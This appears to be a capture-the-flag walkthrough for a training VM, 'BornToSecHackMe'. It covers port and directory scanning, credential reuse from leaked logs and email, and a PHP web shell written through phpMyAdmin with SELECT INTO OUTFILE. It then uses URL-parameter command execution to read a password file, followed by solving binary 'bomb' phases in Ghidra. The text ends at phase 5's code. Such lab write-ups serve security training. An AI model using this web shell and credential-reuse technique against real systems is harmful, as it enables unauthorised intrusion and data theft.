Launch given .iso file with Virtual Box

Scan for its IP adress.

In our case, it is 10.111.1.24

Then we need to find the open ports on this system. To perform it we can use Nmap tool. If it is not installed on the machine, type:

> brew install nmap

Scan a range of IPs starting with an IP address found step before. Type in terminal:

> nmap 10.111.1.24

We receive available ports on the system. Our output:

> nmap 10.111.1.24
> Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-26 19:58 EEST
> Nmap scan report for 10.111.1.24
> Host is up (0.11s latency).
> Not shown: 994 closed ports
> PORT    STATE SERVICE
> 21/tcp  open  ftp
> 22/tcp  open  ssh
> 80/tcp  open  http
> 143/tcp open  imap
> 443/tcp open  https
> 993/tcp open  imaps

We see the open ports through which we can try to hack the system.

We see that http port (80) for 10.111.1.24 is open. So we can look for existing Web Objects. We will use DIRB package.
DIRB will monitor the response of the web service to advise us of any redirects/authentication requests/directory listings/etc. To install it (if not yet installed) just clone the repo (github.com/v0re/dirb.git) and "make" the programm:

1) > git clone https://github.com/v0re/dirb.git
2) > cd dirb
3) > ./configure
4) > make

To find the entries launch the following:

> ./dirb https://10.111.1.24/ wordlists/common.txt

It gives us the list of web directories, main of them are: 
	
	- https://10.111.1.24/phpmyadmin/
	- https://10.111.1.24/webmail/
	- https://10.111.1.24/forum/

Let's explore them. https://10.111.1.24.134/phpmyadmin/ requires login and password. The same thing for https://10.111.1.24/webmail/. 
Let's try to find some information on the forum (https://10.111.1.24/forum/). There are four topics on the forum. 
We observe the topic "Probleme login ?" created by lmezard. Looking through the forum logs we can see the line with the `Failed password for invalid user !q\]Ej?*5K5cy*AJ`

> Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

A little bit later, on Oct 5 08:46:01, the session was opened for user lmezard:

> Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

We can assume that invalid user `!q\]Ej?*5K5cy*AJ` is actually a password for lmezard user. So we try to login to forum. It is 
successful. After login we are looking for some information in the lmezard profile. And there is only an E-mail address: laurie@borntosec.net.

Assuming that user can use the same login and password for several directories we tried to get access to mailing service of lmezard.
So we antered login `lmezard` and password `!q\]Ej?*5K5cy*AJ` to login to the page https://10.111.1.24/webmail/ which we found earlier with DIRB.

That was successful. Here we have two mails. One of them is called "DB Access". Inside we have:

> Hey Laurie,
> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
> Best regards.

As it is DB Access we assume it is a password to phpmyadmin directory found using DIRB. So we try to use this login and password to acces the third directory - https://10.111.1.24/phpmyadmin/. Use login `root` and password `Fg-'kKXBj87E:aJ$`
Login is successful. 

PHP-MyAdmin is a GUI based interface for MySQL database. So we will try to get to shell throug it.
We will use command shell_exec â€” Execute command via shell and return the complete output as a string. 
The problem is where to store the output. We tied to use all the directories found using DIRB tool earlier:


SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/1.php"
> #1 - Can't create/write to file '/var/www/forum/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/phpmyadmin/1.php"
> #1 - Can't create/write to file '/var/www/phpmyadmin/1.php' (Errcode: 2)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/webmail/1.php"
> #1 - Can't create/write to file '/var/www/webmail/1.php' (Errcode: 2)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/js/1.php"
> #1 - Can't create/write to file '/var/www/forum/js/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/lang/1.php"
> #1 - Can't create/write to file '/var/www/forum/lang/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/modules/1.php"
> #1 - Can't create/write to file '/var/www/forum/modules/1.php' (Errcode: 13)

SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/templates_c/1.php"
> Your SQL query has been executed successfully ( Query took 0.0001 sec )


Successful. The output was stored on https://10.111.1.24/forum/templates_c/1.php in templates_c folder.
The file is blank, but now we have access to shell comand line and can add shell commands to the end of the address string and get its output on this page. 

First, we look at the /home directory. Type afther the address string https://10.111.1.24/forum/templates_c/1.php the following:

?cmd=ls /home

The full string will look like this:
`https://10.111.1.24/forum/templates_c/6.php?cmd=ls /home`

The output is:

> LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

We have there seven directories: LOOKATME, ft_root, laurie, laurie@borntosec.net, lmezard, thor, zaz. Let's look what we have inside them.

In the first directory LOOKATME there is a file "password". Other directories are empty. Lets look what is inside the "password" file. Type after the address string:

?cmd=cat /home/LOOKATME/password

The full string will look like this: 
> https://10.111.1.24/forum/templates_c/6.php?cmd=cat%20/home/LOOKATME/password

The output is:

lmezard:G!@M6f4Eatau{sF"

So we have login and password: lmezard	G!@M6f4Eatau{sF"

We assume that this login and password can be used 
Now we can try to connect through ssh or ftp ports using obtained login and password. For these proposes we need installed inetutils tool:

"brew install inetutils"

"ftp 10.111.1.24"

It requires Name and Password. Try to login. 

> 230 Login successful.

Here we have 2 files: 


ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.


Let's download these files:

ftp> get README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
96 bytes received in 0.000158 seconds (593 kbytes/s)
ftp> get fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
WARNING! 2764 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
808960 bytes received in 0.089 seconds (8.67 Mbytes/s)
ftp> quit
221 Goodbye.


Let's check what types of files do we have. Use command "file" to understand it:

"file README"

> README: ASCII text

"file fun"

> fun: POSIX tar archive (GNU)


Inside README file we have the following information:

"cat README"

> Complete this little challenge and use the result as password for user 'laurie' to login in ssh


We see that the other file is an archive. Untar it using "tar -xvf" command:

"tar -xvf fun"

As a result, we have the directory ft_fun.

Here we have 750 files with similar content. Example:

"cat 99VAL.pcap"


> void useless() {

> //file60%

In every file we have a line of some code and the number of this file. We can guess that we can combine these files to have this code. First we need to arrange these files according their numbers in ascending order. Let's use this script to rename the files as they are in their content after "//file":


"for file in *.pcap; do
text="$(grep -a "//file" "$file" | awk -F '//file' '{print $2}')"
grep -v "//file" "$file" > temp && mv temp "$file"
mv "$file" "$text.pcap"
done"


Then concatenate all the files in ascending order:


"cat $(find ./ -name "*.pcap" | sort -V) > code.cpp"


We received file with a code. Now let's compile and execute it:

"gcc newfile.cpp"
"./a.out"

> MY PASSWORD IS: Iheartpwnage
> Now SHA-256 it and submit

Let's generate SHA-256 encription of this password using https://emn178.github.io/online-tools/sha256.html

The result is:
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4


Now we will follow instructions in README and will try to login in ssh with login laurie and this coded password.

"ssh laurie@10.111.1.24"

"ls"
> bomb  README

Let's check what the types of files do we have:

"file README"
> README: ASCII text

"file bomb"
> bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped

Let's execute bomb file:

"./bomb"
> Welcome this is my little bomb !!!! You have 6 stages with
> only one life good luck !! Have a nice day!

"cat README"
> When you have all the password use it as "thor" user with ssh.
>
> HINT:
> P
>  2
>  b
>
> o
> 4
>
> NO SPACE IN THE PASSWORD (password is case sensitive).

Now we will download and will try to refuse this "bomb".

Write in terminal and enter the password:

"scp laurie@10.111.1.24:bomb ."

Bobm is an executable file. We can try to restore the code using GHIDRA software. For these proposes we need installed GDK:

"brew cask install ghidra"

https://www.oracle.com/technetwork/java/javase/downloads/jdk12-downloads-5295953.html
Download and untar.

go to  ~/.brew/Caskroom/ghidra/9.0.2_PUBLIC_20190403/ghidra_9.0.2

"export PATH=[path to JDK]/bin:$PATH"

Past the file bomb in hydra. Go to "functions" folder, choose "main". 
We see phase_1 ... phase_6.
We can guess that these phases are answers for the 6 stages from this file.

Let's go through these phases to defuse the bomb.

Phase 1 has the following code:

> void phase_1(undefined4 param_1)
> 
> {
>   int iVar1;
>   
>   iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
>   if (iVar1 != 0) {
>     explode_bomb();
>   }
>   return;
> }

The answer of this stage will be the string "Public speaking is very easy."
If we check it and enter this string as an answer for the first stage after launching "bomb", we will receive the following output:

> Phase 1 defused. How about the next one?

Phase 2 has the following code:

> void phase_2(undefined4 param_1)
> 
> {
>   int iVar1;
>   int aiStack32 [7];
>   
>   read_six_numbers(param_1,aiStack32 + 1);
>   if (aiStack32[1] != 1) {
>     explode_bomb();
>   }
>   iVar1 = 1;
>   do {
>     if (aiStack32[iVar1 + 1] != (iVar1 + 1) * aiStack32[iVar1]) {
>       explode_bomb();
>     }
>     iVar1 = iVar1 + 1;
>   } while (iVar1 < 6);
>   return;
> }

So the we have here 6 elements in the aiStack32, the first element = 1, every folowing element of this stack has to be equal to the multiplication of value of previous element on its value + 1. We can solve this stage: 


1, 1*2 (=2), 2*3 (=6), 6*4(=24), 24*5 (=120), 120*6 (=720)

If we check it and enter "1 2 6 24 120 720" as an answer for the second stage after launching "bomb", we will receive the following output:

> That's number 2.  Keep going!


Phase 3 has the following code:

void phase_3(char *param_1)

> {
>   int iVar1;
>   char cVar2;
>   uint local_10;
>   char local_9;
>   int local_8;
>   
>   iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
>   if (iVar1 < 3) {
>     explode_bomb();
>   }
>   switch(local_10) {
>   case 0:
>     cVar2 = 'q';
>     if (local_8 != 0x309) {
>       explode_bomb();
>     }
>     break;
>   case 1:
>     cVar2 = 'b';
>     if (local_8 != 0xd6) {
>       explode_bomb();
>     }
>     break;
>   case 2:
>     cVar2 = 'b';
>     if (local_8 != 0x2f3) {
>       explode_bomb();
>     }
>     break;
>   case 3:
>     cVar2 = 'k';
>     if (local_8 != 0xfb) {
>       explode_bomb();
>     }
>     break;
>   case 4:
>     cVar2 = 'o';
>     if (local_8 != 0xa0) {
>       explode_bomb();
>     }
>     break;
>   case 5:
>     cVar2 = 't';
>     if (local_8 != 0x1ca) {
>       explode_bomb();
>     }
>     break;
>   case 6:
>     cVar2 = 'v';
>     if (local_8 != 0x30c) {
>       explode_bomb();
>     }
>     break;
>   case 7:
>     cVar2 = 'b';
>     if (local_8 != 0x20c) {
>       explode_bomb();
>     }
>     break;
>   default:
>     cVar2 = 'x';
>     explode_bomb();
>   }
>   if (cVar2 != local_9) {
>     explode_bomb();
>   }
>   return;
> }


We see that there should be 3 arguments on this stage: "%d %c %d".

If we look to the README file that was together with the bomb, we will see that this file contains 6 lines, every one of which have a hint: For the firs stage we have the firs letter 'P', the second character in the second line is '2', which is also true for the second stage. So we suspect that on the 3rd stage we will also have a hint. In the 3rd line we have symbol 'b' on place of the second character. So we understand that the second argument for the 3rd stage could be 'b'.

In this case we have the following possible solitions for this stage:
"1 b 214", "2 b 755", "7 b 524".

We have the following output:

> Halfway there!


Phase 4 has the following code:

void phase_4(char *param_1)

> {
>   int iVar1;
>   int local_8;
>   
>   iVar1 = sscanf(param_1,"%d",&local_8);
>   if ((iVar1 != 1) || (local_8 < 1)) {
>     explode_bomb();
>   }
>   iVar1 = func4(local_8);
>   if (iVar1 != 0x37) {
>     explode_bomb();
>   }
>   return;
> }

We have here also a function func4:

> int func4(int param_1)
> {
>   int iVar1;
>   int iVar2;
>   
>   if (param_1 < 2) {
>     iVar2 = 1;
>   }
>   else {
>     iVar1 = func4(param_1 + -1);
>     iVar2 = func4(param_1 + -2);
>     iVar2 = iVar2 + iVar1;
>   }
>   return iVar2;
> }


We wrote the main function to the func4 to see which number will give '55' (0x37 in hexadecimal), as needed in the phase_4. The output of this function is:

> number is: 1, function 4 gives: 1
> number is: 2, function 4 gives: 2
> number is: 3, function 4 gives: 3
> number is: 4, function 4 gives: 5
> number is: 5, function 4 gives: 8
> number is: 6, function 4 gives: 13
> number is: 7, function 4 gives: 21
> number is: 8, function 4 gives: 34
> number is: 9, function 4 gives: 55
> number is: 10, function 4 gives: 89

So the answer for this stage is 9.

The output from "bomb" after entering this answer is:

> So you got that one.  Try this one.


Keep going. Phase 5 has the following code:

void phase_5(int param_1)

> {
>   int iVar1;
>   undefined local_c [6];
>   undefined local_6;
>   
>   iVar1 = string_length(param_1);
>   if (iVar1 != 6) {
>     explode_bomb();
>   }
>   iVar1 = 0;
>   do {
>     local_c[iVar1] = (&array.123)[(int)(char)(*(byte *)(iVar1 + param_1) & 0xf)];
>     iVar1 = iVar1 + 1;
>   } while (iVar1 < 6);
>   local_6 = 0;
>   iVar1 = strings_not_equal(local_c,"giants");
>   if (iVar1 != 0) {
>     explode_bomb();
>   }
>   return;
> }














